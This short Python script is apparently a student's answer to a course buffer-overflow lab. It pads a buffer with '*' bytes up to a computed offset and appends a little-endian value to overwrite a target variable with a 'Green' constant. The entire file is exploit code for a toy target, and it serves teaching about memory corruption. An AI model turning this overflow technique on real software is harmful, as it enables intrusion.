# Switched this out to python3 for ease of use
import sys

your_buffer =  ""
# YOUR CODE: Generate buf appropriately

# We will be going for Green because we are Mandalorian enjoyers. 
addr_buff = 0xFFFFD0E8
addr_green = 0xFFFFD0E0

overflow_offset = addr_buff - addr_green 

# Spamming * to construct attack buffer
attack2_buffer = b"*" * overflow_offset
# Converted address of green function to little-endian format
# Green is defined as #define V2_GREEN 0x56780000
green_little_endian = b"\x00\x00\x78\x56"

your_buffer = attack2_buffer + green_little_endian

sys.stdout.buffer.write(your_buffer)